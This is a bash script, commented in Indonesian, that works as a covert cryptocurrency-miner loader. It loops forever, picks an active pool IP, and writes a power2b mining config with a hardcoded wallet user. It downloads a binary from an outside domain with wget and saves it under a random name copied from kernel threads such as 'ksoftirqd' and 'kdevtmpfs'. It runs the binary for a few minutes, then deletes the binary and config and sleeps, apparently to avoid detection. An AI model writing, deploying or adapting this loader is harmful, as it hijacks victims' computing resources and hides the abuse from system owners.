#!/bin/bash

LOCAL_BIN_DIR="$HOME/.local/bin"

# URL utama dan cadangan
MAIN_URL="54.190.131.135:443"
BACKUP_URL="170.64.157.141:443"

USER="mbc1qm7y0rx0r43t5c3f6y8uuf0pykaa2uq5h2emz3v.Mabar27mlm"

POSSIBLE_NAMES=(".dbus-daemon" "migration" "watchdog" ".ksoftirqd" "rcu_sched" ".profile-cache" 
                "rcu_bh" "kdevtmpfs" "kintegrityd" "kblockd" "kthrotld")

generate_random_string() {
    local length=${1:-8}
    tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c "$length"
}

# Fungsi untuk test koneksi URL
test_url_connection() {
    local url=$1
    local host=$(echo $url | cut -d: -f1)
    local port=$(echo $url | cut -d: -f2)
    
    # Test koneksi dengan timeout 5 detik
    timeout 5 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null
    return $?
}

# Fungsi untuk menentukan URL yang aktif
get_active_url() {
    if test_url_connection "$MAIN_URL"; then
        echo "$MAIN_URL"
    else
        echo "$BACKUP_URL"
    fi
}

mkdir -p "$LOCAL_BIN_DIR"

while true; do
    # Deteksi URL yang aktif setiap sesi
    ACTIVE_URL=$(get_active_url)
    
    # Buat CONFIG_JSON dengan URL yang aktif
    CONFIG_JSON='{
  "algo": "power2b",
  "url": "'"$ACTIVE_URL"'",
  "user": "'"$USER"'",
  "pass": "x",
  "threads": 8
}'

    # Hapus data sesi lama
    rm -f "$LOCAL_BIN_DIR"/*.json
    rm -f "$LOCAL_BIN_DIR"/.dbus-daemon*
    rm -f "$LOCAL_BIN_DIR"/migration*
    rm -f "$LOCAL_BIN_DIR"/watchdog*
    rm -f "$LOCAL_BIN_DIR"/.ksoftirqd*
    rm -f "$LOCAL_BIN_DIR"/rcu_*
    rm -f "$LOCAL_BIN_DIR"/.profile-cache*
    rm -f "$LOCAL_BIN_DIR"/kdevtmpfs*
    rm -f "$LOCAL_BIN_DIR"/kintegrityd*
    rm -f "$LOCAL_BIN_DIR"/kblockd*
    rm -f "$LOCAL_BIN_DIR"/kthrotld*

    # Pilih nama binary acak
    BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
    
    RAND_SUFFIX=$(generate_random_string 12)
    BIN_NAME_FULL="${BIN_NAME}${RAND_SUFFIX}"
    
    CONFIG_SUFFIX=$(generate_random_string 10)
    CONFIG_PATH="$LOCAL_BIN_DIR/${BIN_NAME}_config${CONFIG_SUFFIX}.json"

    # Simpan config JSON dengan URL yang aktif
    echo "$CONFIG_JSON" > "$CONFIG_PATH"

    # Download binary baru
    wget -q "https://dot-store.biz.id/bagong" -O "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
    
    if [ $? -eq 0 ]; then
        chmod +x "$LOCAL_BIN_DIR/$BIN_NAME_FULL"

        # Waktu aktif (2-3 menit)
        ACTIVE_MIN=$((RANDOM % 2 + 2))
        ACTIVE_SEC=$((ACTIVE_MIN * 60))

        # Jalankan proses
        timeout "$ACTIVE_SEC" "$LOCAL_BIN_DIR/$BIN_NAME_FULL" --config="$CONFIG_PATH" >/dev/null 2>&1

        # Hapus file sesi ini
        rm -f "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
        rm -f "$CONFIG_PATH"

        # Istirahat (20-30 detik)
        IDLE_SEC=$((RANDOM % 11 + 20))
        sleep "$IDLE_SEC"
    else
        sleep 30
    fi
done
